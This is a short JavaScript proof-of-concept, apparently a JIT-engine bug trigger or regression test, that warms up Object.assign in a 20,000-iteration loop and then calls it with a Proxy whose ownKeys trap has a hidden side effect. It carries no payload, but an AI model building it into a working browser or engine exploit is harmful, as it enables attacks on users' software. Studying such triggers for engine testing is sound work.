function poc(target, source) {
  Object.assign(target, source);
}

for (let i = 0; i < 20000; i++) {
  poc({}, {
    a: 1
  });
}

let target = {};
let proxy = new Proxy({}, {
  ownKeys(o) {
    new Map().set(target, 1);
    return ['foo'];
  },
  getOwnPropertyDescriptor(o, prop) {
    return {
      value: 1,
      enumerable: true,
      configurable: true,
    };
  },
});

poc(target, proxy);